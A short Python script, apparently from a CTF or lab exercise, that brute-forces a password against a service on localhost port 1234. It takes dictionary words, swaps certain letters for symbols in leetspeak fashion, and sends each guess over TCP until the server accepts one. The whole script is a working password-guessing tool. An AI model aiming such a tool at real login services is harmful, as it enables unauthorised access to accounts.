import string, sys, socket

IP = 'localhost'
PORT = 1234

def dictionary_attack():
    
    to_exchange = {

            'C': '(', 'c': '(',
            'E': '3', 'e': '3',
            'I': '|', 'i': '|',
            'O': '#', 'o': '#',
            'T': '/', 't': '/',
            'V': '<', 'v': '<',

            }

    table = str.maketrans(to_exchange)


    with open(sys.argv[1], "r", encoding="utf-8") as file:
        for line in file:
            new_line = line.strip()

            for word in new_line.split():
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((IP,PORT))

                new_word = word.strip(string.punctuation + '\n')
                
                new_word = new_word.translate(table)

                try:
                    sock.sendall(new_word.encode('ascii'))
                except BrokenPipeError:
                    print("Server error")

                answer = sock.recv(1024)

                if answer == b'1':
                    print(f"Passwort gefunden: {new_word} \n Original Wort: {word}")
                    sock.close()
                    return

                sock.close()

dictionary_attack()
